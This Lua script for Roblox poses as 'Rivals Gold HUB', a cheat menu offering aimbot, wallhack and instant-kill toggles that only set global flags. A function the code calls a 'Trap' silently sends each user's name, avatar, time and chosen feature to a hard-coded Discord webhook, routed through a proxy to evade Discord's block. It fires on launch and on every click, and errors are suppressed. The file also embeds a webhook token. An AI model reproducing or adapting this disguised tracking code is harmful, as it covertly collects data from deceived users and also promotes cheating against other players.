-- [[ 🥇 RIVALS GOLD HUB - PREMIER EDITION 🥇 ]] --
-- CEO: YOUSEF | Powered by WindowsLacido Security

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- [[ CONFIGURATION ]] --
local WEBHOOK_URL = "https://discord.com/api/webhooks/1489222350682591412/yw1sBcPiGUwiRo3xLxT2X7YStygZ3oNGzwR8dUD9f7NhVB9dLvbbXX5LBFmVM05PlBlW"
local PROXY = "https://hooks.hyra.io/" -- Bypasses Discord's Roblox block

-- [[ 1. THE GOLD SENTINEL (Trap System) ]] --
local function SendEvidence(feature)
    local thumbType = Enum.ThumbnailType.HeadShot
    local thumbSize = Enum.ThumbnailSize.Size420x420
    local content, isReady = Players:GetUserThumbnailAsync(LocalPlayer.UserId, thumbType, thumbSize)
    
    local data = {
        ["embeds"] = {{
            ["title"] = "🥇 Rivals Gold HUB: Execution Log",
            ["description"] = "New user verified via WindowsLacido Cloud.",
            ["color"] = 16766720, -- Gold
            ["thumbnail"] = { ["url"] = content },
            ["fields"] = {
                {["name"] = "User", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
                {["name"] = "Time (UTC)", ["value"] = "```" .. os.date("!%X") .. "```", ["inline"] = true},
                {["name"] = "Module Activated", ["value"] = "```" .. feature .. "```", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Rivals Gold HUB Persistence Module"}
        }}
    }
    
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL:gsub("https://discord.com/", PROXY), HttpService:JSONEncode(data))
    end)
end

-- [[ 2. SMOOTH UI ENGINE ]] --
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 0, 0, 0) -- Starts at 0 for "Glide" intro
Main.Position = UDim2.new(0.5, 0, 0.5, 0)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.ClipsDescendants = true

-- Add Gold Gradient
local Gradient = Instance.new("UIGradient", Main)
Gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 0)), -- Gold
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 250, 230)), -- White Gold
    ColorSequenceKeypoint.new(1, Color3.fromRGB(184, 134, 11)) -- Dark Gold
})
Gradient.Rotation = 45

-- Glide Intro Animation
Main:TweenSizeAndPosition(UDim2.new(0, 320, 0, 400), UDim2.new(0.5, -160, 0.5, -200), "Out", "Back", 0.8)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundTransparency = 1
Title.Text = "RIVALS GOLD HUB"
Title.TextColor3 = Color3.white
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20

-- [[ 3. FEATURE TOGGLES ]] --
local function CreateGoldButton(name, yPos, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.8, 0, 0, 45)
    btn.Position = UDim2.new(0.1, 0, 0, yPos)
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    btn.Font = Enum.Font.GothamMedium
    
    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0, 8)
    
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}):Play()
    end)
    
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
    end)

    btn.MouseButton1Click:Connect(function()
        SendEvidence(name) -- The Trap
        callback()
    end)
end

-- Feature Buttons
CreateGoldButton("🥇 Aimbot (Head-Lock)", 70, function() _G.Aimbot = true end)
CreateGoldButton("👁️ ESP (Wallhack)", 130, function() _G.ESP = true end)
CreateGoldButton("⚡ Silent Aim (Bypass)", 190, function() _G.Silent = true end)
CreateGoldButton("🔥 Instant Kill", 250, function() _G.Insta = true end)

SendEvidence("Script Executed") -- Initial log
print("Rivals Gold HUB: Data Synced.")
